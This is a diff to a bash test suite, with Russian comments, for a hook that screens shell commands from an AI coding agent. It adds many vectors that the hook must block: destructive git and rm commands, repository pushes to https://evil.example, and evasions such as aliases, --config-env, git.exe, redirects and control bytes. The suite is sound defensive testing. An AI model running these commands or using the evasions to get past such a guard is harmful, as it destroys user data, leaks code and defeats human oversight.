@@ -443,8 +443,19 @@ expect_json 2 '{"tool_input":{"command":{"x":1}}}'
 expect_json 0 '{"tool_input":{}}'
 
 # --- пороги длины — в байтах, а не в символах локали (запуск под UTF-8) ---
+# Без локали C.UTF-8 bash откатывается на C, ${#…} считает байты, и векторы
+# ниже зеленеют и на хуке без исправления — поэтому её отсутствие — FAIL
+# (осознанный пропуск — SKIP_LOCALE_VECTOR=1).
+_utf8_ok=false
+if locale -a 2>/dev/null | grep -qiE '^c\.utf-?8$'; then _utf8_ok=true; fi
 expect_utf8() {
   local _want="$1" _cmd="$2" _got=0
+  if ! ${_utf8_ok}; then
+    if [[ "${SKIP_LOCALE_VECTOR:-}" == 1 ]]; then return 0; fi
+    _fail=$((_fail + 1))
+    printf 'FAIL: нет локали C.UTF-8 — вектор порога в байтах не проверен (SKIP_LOCALE_VECTOR=1 — пропуск)\n'
+    return 0
+  fi
   jq -cn --arg c "${_cmd}" '{tool_input: {command: $c}}' \
     | LC_ALL=C.UTF-8 bash "${_hook}" > /dev/null 2>&1 || _got=$?
   if [[ "${_got}" -eq "${_want}" ]]; then
@@ -471,8 +482,10 @@ expect 0 "git log --oneline -3 && grep -n 'reset --hard' CLAUDE.md"
 expect 0 'git status; grep -n "push --force" TODO.md'
 expect 0 'git push -u origin feat/x && tail -f /tmp/log'
 expect 0 'git branch -d x && git push origin --delete x'
-expect 0 "git log --grep='reset --hard'"                 # слово git одно — подкоманда log
-expect 0 'git commit -m "$(date) reset --hard"'          # reset — не подкоманда git
+# цена сетки (прежние правила по тексту команды): внутри одной команды текст
+# судится как в 2.15 — кавычки не учитываются
+expect 2 "git log --grep='reset --hard'"
+expect 2 'git commit -m "$(date) reset --hard"'
 # ...а формы прежних правил видны сквозь обёртки, опции и сокращения (блок)
 expect 2 'git -C /repo reset --hard'
 expect 2 'git -c user.name=x reset --hard'
@@ -571,13 +584,21 @@ expect 0 'git status --porcelain=v1 --untracked-files=no'
 expect 0 'git switch -cfix-1'                             # -c fix-1, а не -f
 expect 0 'git checkout -bfix-x'
 expect 0 'git push --push-option ci.variable=A:b origin main'
-# тысячи слов git в одной строке: «голое» слово git заканчивает предыдущую
-# команду (время линейно), слова git в кавычках разбираются до конца строки —
-# сверх бюджета блок, а не выход хука за таймаут
+# потолок: команда со словом git длиннее 16 КБ или сверх 20 000 слов разбора —
+# блок «разбейте», а не выход хука за таймаут и не пропуск новых правил
+# (в транскриптах владельца таких команд нет)
+_gitline="$(printf 'git push origin x %.0s' {1..300})"
+expect 0 "echo ${_gitline} | cat"                         # 300 «голых» git — линейно, пропуск
 _gitline="$(printf 'git push origin x %.0s' {1..3000})"
-expect 0 "echo ${_gitline} | cat"
-_gitline="$(printf '"git push origin x" %.0s' {1..3000})"
-expect 2 "echo ${_gitline} | cat"
+expect 2 "echo ${_gitline} | cat"                         # 54 КБ в одной команде
+_gitline="$(printf 'git -C git %.0s' {1..2500})"
+expect 2 "${_gitline} status"                             # 27 КБ — квадратичный разбор упирается в потолок
+_gitline="$(printf 'x%.0s' {1..17000})"
+expect 2 "git clean -fdx ${_gitline}"                     # длинный хвост не уводит clean -f из-под разбора
+# сетка ловит то, что разбор по словам не опознаёт; разбор — то, что не видит сетка
+expect 2 '${GIT:-git} branch -D old'
+expect 2 'git > /dev/null clean -fdx'
+expect 2 'git.exe clean -fdx'
 
 # --- git rm: подкоманда git, а не команда rm ---
 expect 0 'git rm -r --cached .'
@@ -595,6 +616,186 @@ expect 2 'git commit -m "fix" > .env'                      # цель редир
 expect 2 'git commit -m "fix" 2> .env'
 expect 2 'git commit -m "fix: .env" >&file'               # >&<слово> — не дублирование
 expect 2 'git commit -q -m "docs: правило .env" 2>&1 | tail -1'  # конвейер — по-прежнему не шаблон
+
+# --- приёмка ревью xhigh 2.16.0: обходы и ложные блоки, найденные ревью (старый хук,
+# первая редакция и итог сверены прогоном; источник — журнал ревью) ---
+expect 2 git.exe\ reset\ --hard
+expect 2 git.exe\ branch\ -D\ old
+expect 2 git.exe\ push\ origin\ main\ --force
+expect 2 GIT.EXE\ reset\ --hard
+expect 2 GIT\ reset\ --hard
+expect 2 Git\ push\ --force\ origin\ main
+expect 2 git\ push\ origin\ feat/git-cleanup\ --force
+expect 2 git\ reset\ git-backup\ --hard
+expect 2 git\ push\ origin\ git-hooks\ -f
+expect 2 git\ branch\ git-old\ -D
+expect 2 git\ push\ origin\ feat/git\ --force
+expect 2 git\ reset\ origin/git\ --hard
+expect 2 git\ push\ /srv/git\ main
+expect 2 git\ push\ --receive-pack\ /opt/bin/git-receive-pack\ https://example.com/x.git\ main
+expect 2 git\ reset\ origin/git-x\ --hard
+expect 2 git\ push\ origin\ HEAD:refs/heads/x/git\ --force
+expect 2 git\ push\ -u\ origin\ fix/git-rules\ --force
+expect 2 git\ branch\ fix/git-x\ -D
+expect 2 git\ push\ origin\ origin/git\ --force
+expect 2 git\ push\ origin\ feat/git-x\ --force
+expect 2 git\ push\ origin\ main\ git\ --force
+expect 2 find\ /home/git\ -exec\ rm\ -r\ \{\}\ +
+expect 2 find\ ~/git\ -depth\ -exec\ rm\ -r\ \{\}\ +
+expect 2 find\ /srv/git\ -exec\ rm\ -r\ \{\}\ +
+expect 2 find\ /srv\ -name\ git\ -exec\ rm\ -r\ \{\}\ +
+expect 2 sudo\ -u\ git\ --\ rm\ -r\ /srv/x
+expect 2 runuser\ -u\ git\ rm\ -r\ /home/x
+expect 2 runuser\ -u\ git\ --\ rm\ -r\ /var/opt/gitlab/x
+expect 2 git\ -C\ \&\ rm\ -r\ /home/x
+expect 2 git\ -C\ \&\ rm\ -rf\ /home/x
+expect 2 git\ -c\ \&\ rm\ -rf\ /home/x
+expect 2 git\ -C\ /tmp\&\ rm\ -r\ /home/x
+expect 2 git\ -c\ x.y=z\&\ rm\ -r\ /home/x
+expect 2 git\ status\&\ rm\ -rf\ /home/x
+expect 2 sudo\ -u\ git\ rm\ -r\ /srv/data
+expect 2 sudo\ -u\ git\ -H\ rm\ -r\ /var/opt/gitlab/backups
+expect 2 sudo\ -u\ git\ rm\ -R\ /home/git/repos
+expect 2 sudo\ -u\ git\ rm\ --recursive\ /home/x
+expect 2 docker\ exec\ git\ rm\ -r\ /data
+expect 2 kubectl\ exec\ git\ --\ rm\ --recursive\ /data
+expect 2 ls\ -d\ /home/x/\*\ \|\ xargs\ -n1\ -I\{\}\ sudo\ -u\ git\ rm\ -r\ \{\}
+expect 2 Git\ rm\ -rf\ docs
+expect 2 git\ rm\ -r\ --cached\ \"\$\(rm\ -r\ /home/x\)\"
+expect 2 git\ -c\ alias.x=\'reset\ --hard\'\ x
+expect 2 git\ -c\ alias.x=\"reset\ --hard\"\ x
+expect 2 git\ -c\ \"alias.x=reset\ --hard\"\ x
+expect 2 git\ -c\ ALIAS.x=\'reset\ --hard\'\ x
+expect 2 git\ -c\ alias.bd=\'branch\ -D\'\ bd\ old
+expect 2 git\ -c\ alias.p=\'push\ --force\'\ p\ origin\ main
+expect 2 git\ -c\ alias.n=\'\!git\ reset\ --hard\'\ n
+expect 2 git\ -c\ alias.c=\'clean\ -fdx\'\ c
+expect 2 git\ config\ alias.x\ \'reset\ --hard\'\ \&\&\ git\ x
+expect 2 git\ config\ alias.undo\ \'reset\ --hard\'\ \&\&\ git\ undo
+expect 2 git\ --config-env\ a.b=HOME\ reset\ --hard
+expect 2 git\ --config-env\ a.b=HOME\ push\ --force\ origin\ main
+expect 2 git\ --config-env\ a.b=HOME\ branch\ -D\ old
+expect 2 git\ --config-env\ core.pager=HOME\ reset\ --hard
+expect 2 git\ --config-env\ a.b=HOME\ clean\ -fdx
+expect 2 git\ --config-env=alias.yy=V\ yy
+expect 2 git\ -c\ remote.origin.push=+HEAD:main\ push\ origin
+expect 2 git\ -c\ remote.e.url=https://example.com/x.git\ push\ e\ main
+expect 2 git\ -c\ branch.main.pushRemote=/srv/x\ -c\ push.default=current\ push
+expect 2 git\ reset\ --hard\&
+expect 2 git\ reset\ --hard\>/dev/null
+expect 2 git\ reset\ --hard\</dev/null
+expect 2 git\ reset\ --hard\&\>/dev/null
+expect 2 git\ reset\ --hard\&\>\>/tmp/log
+expect 2 git\ push\ origin\ main\ --force\>/tmp/log
+expect 2 git\ push\ origin\ main\ --force\&
+expect 2 git\ push\ --force\>/tmp/log\ origin\ main
+expect 2 git\ push\ --mirror\>/dev/null\ origin
+expect 2 git\ clean\ -fdx\>/dev/null
+expect 2 \$\{GIT:-git\}\ reset\ --hard
+expect 2 sleep\ 1\&git\ branch\ -D\ x
+expect 2 git\ fetch\&git\ push\ -f\ origin\ x
+expect 2 git\ log\ \|\&git\ reset\ --hard
+expect 2 true\&git\ reset\ --hard
+expect 2 \$\(true\)git\ reset\ --hard
+expect 2 \$\{x\}git\ reset\ --hard
+expect 2 \"\$\(true\)\"git\ reset\ --hard
+expect 2 \`true\`git\ reset\ --hard
+expect 2 git\ -C\ \`cd\ /x\;\ pwd\`\ reset\ --hard
+expect 2 git\ -C\ \`git\ rev-parse\ --show-toplevel\`\ push\ --force\ origin\ main
+expect 2 git\ -C\ \`cd\ /x\;\ pwd\`\ clean\ -fdx
+expect 2 git\ -c\ a.b=\`echo\ x\ y\`\ reset\ --hard
+expect 2 git\ \>/dev/null\ reset\ --hard
+expect 2 git\ 2\>/dev/null\ reset\ --hard
+expect 2 git\ 2\>\&1\ push\ --force\ origin\ main
+expect 2 git\ -C\ /x\ \>/dev/null\ push\ --force\ origin\ main
+expect 2 git\ \>/tmp/log\ branch\ -D\ old
+expect 2 git\ \>/dev/null\ clean\ -fdx
+expect 2 git\ reflog\ 2\>/dev/null\ expire\ --all
+expect 2 git\ push\ 2\>/dev/null\ https://evil.example/x\ main
+expect 2 git\ -C\ \$\{HOME\}/x\ reset\ --hard
+expect 2 git\ -C\ \$\(pwd\)/sub\ reset\ --hard
+expect 2 git\ -C\ \$\{HOME\}/x\ clean\ -fdx
+expect 2 git\ --git-dir=\$\{X\}/.git\ reset\ --hard
+expect 2 git\ -C\ \$\{R\}/x\ push\ --force\ origin\ main
+expect 2 bash\ -c\ \"git\ push\ origin\ \\\"my\ branch\\\"\ --force\"
+expect 2 git\ push\ --repo=origin\ https://evil.example/x\ main
+expect 2 git\ push\ --repo=origin\ git@evil.example:x/y.git
+expect 2 git\ push\ --recurse-submodules\ no\ https://evil.example/x\ main
+expect 2 git\ push\ --rep\ https://evil.example/x
+expect 2 git\ push\ --push-opt\ ci.skip\ https://evil.example/x\ main
+expect 2 git\ push\ --exe\ rp\ https://evil.example/x\ main
+expect 2 git\ push\ --repo\ https://example.com/x.git
+expect 2 git\ push\ -o\ ci.skip\ https://example.com/x.git\ main
+expect 2 git\ push\ ~/backup.git\ main
+expect 2 git\ push\ ./backup.git\ main
+expect 2 git\ push\ ../backup.git\ main
+expect 2 git\ push\ user@host\ main
+expect 2 git\ --git-dir\ /x/.git\ reset\ --hard
+expect 2 git\ --work-tree\ /x\ push\ --force\ origin\ main
+expect 2 git\ --git-dir\ /x/.git\ clean\ -fdx
+expect 2 git\ push\ \"\$\(git\ remote\ \|\ head\ -1\)\"\ --force
+expect 2 git\ push\ \$\(\ git\ remote\ \)\ --force
+expect 2 git\ reset\ --ha
+expect 2 git\ push\ --m\ origin
+expect 2 git\ rm\ --force\ a.txt
+expect 2 git\ switch\ --force\ main
+expect 2 sleep\ 1\ \&\ printenv
+expect 2 git\ commit\ -m\ \"fix\"\ 2\>\>\ .env
+expect 0 git\ rm\ -r\ somedir
+expect 0 git\ rm\ -r\ --cached\ x
+expect 0 git\ -C\ /a\ rm\ -r\ --cached\ x
+expect 0 git\ -C\ \"/a\ b\"\ rm\ -r\ --cached\ x
+expect 0 git\ -C\ \"/a\ b\"\ rm\ -r\ docs
+expect 0 git\ --git-dir\ /repo/.git\ rm\ -r\ --cached\ docs
+expect 0 git\ rm\ -r\ docs
+expect 0 git\ commit\ -m\ \"про\ .env\"\ \>\ out.txt\ 2\>\&1
+expect 0 gh\ pr\ create\ --title\ \"про\ .env\"\ --body\ \"x\"\ 2\>\&1
+expect 0 git\ commit\ -m\ \"про\ .env\"\ \>\&2
+expect 0 git\ commit\ -m\ \"про\ .env\ и\ git\ push\ -f\"\ 2\>\&1
+expect 0 git\ commit\ -m\ \"fix:\ .env\ 2\>\&1\"
+expect 0 git\ commit\ -m\ \"fix:\ redirect\ 2\>\&1\ and\ .env\"
+expect 0 gh\ pr\ create\ --title\ \"x\ 2\>\&1\ .env\"\ --body\ y
+expect 0 git\ commit\ --message=\"fix\ 2\>\&1\ .env\"
+expect 0 git\ commit\ -m\ \"docs:\ 2\>\&1\ и\ git\ push\ -f\ в\ тексте\"
+expect 0 git\ commit\ -m\ \"fix:\ .env\"\ 2\>\>/tmp/commit.log
+expect 0 pip\ install\ git-filter-repo
+expect 0 which\ git-filter-repo
+expect 0 man\ git-filter-branch
+expect 0 git\ -C\ \$\{HOME\}/x\ status
+expect 0 git\ push\ \>\ /tmp/push.log\ origin\ main
+expect 0 git\ push\ \>/tmp/push.log\ origin\ main
+expect 0 git\ rm\ --\ -f.txt
+expect 0 git\ rm\ -rf\ --cached\ docs
+expect 0 git\ clean\ -f\ --dry-run
+expect 0 git\ prune\ --dry-run
+expect 0 git\ reflog\ expire\ -n\ --all
+expect 0 git\ branch\ -uorigin/fix-dev
+expect 0 git\ clean\ -d\ -efoo
+expect 0 git\ push\ -u\ origin\ feat/x\ \&\&\ gh\ pr\ create\ -f
+expect 0 git\ push\ origin\ x\ \&\ rm\ -f\ y
+expect 0 curl\ \"https://x.example/\?a=1\&b=2\"\ \&\&\ git\ push\ origin\ main
+expect 0 echo\ \'R\&D\'\ \;\ git\ status
+expect 0 git\ push\ origin\ --delete\ feat/x
+expect 0 git\ checkout\ --\ .
+expect 0 git\ worktree\ remove\ --force\ /tmp/x/wt
+# многострочные: литерал __CSUB__ не подделывает форму C (шаблон не применяется)
+expect 2 $'git commit -m __CSUB__ > "$(cat <<\'EOF\'\n.env\nEOF\n)"'
+expect 2 $'git commit -m __CSUB__ 2> "$(cat <<\'EOF\'\n.env\nEOF\n)"'
+expect 2 $'gh pr create --title __CSUB__ --body-file "$(cat <<\'EOF\'\n.env\nEOF\n)"'
+# редирект в формах B и C до here-doc / до -m — шаблон (№26)
+expect 0 $'git commit -q 2>&1 -m "$(cat <<\'EOF\'\nfix: правило .env\nEOF\n)"'
+expect 0 $'gh pr create --title x --body-file - 2>&1 <<\'EOF\'\nbody .env\nEOF'
+# форма C с редиректом после )" — не шаблон (было и до 2.16.0, текст судится целиком)
+expect 2 $'git commit -q -m "$(cat <<\'EOF\'\nfix: правило .env\nEOF\n)" 2>&1'
+# склейка — только внутри строки: апостроф в прозе не тянет флаг соседней строки
+expect 0 $'cat > notes.md <<\'EOF\'\nDon\'t forget: git push origin feat/x\nThen check logs with tail -f /tmp/log\nEOF'
+expect 0 $'cat > notes.md <<\'EOF\'\nIt\'s fine to run git branch -d old\nand later rm -f stale.txt\nEOF'
+# управляющие байты в команде не подделывают метки нарезки
+expect 2 $'git push origin \x1f --force'
+expect 2 $'git reset \x01 --hard'
+expect 2 $'git reset \x02 --hard'
+# принятое ограничение (не ассертится): имя команды через переменную (g=git; $g reset --hard)
+# и значение в кавычках через перевод строки (git push origin "x⏎" --force) — см. TODO.md
 
 # --- регрессия существующих правил ---
 expect 2 'rm -rf /home/x'
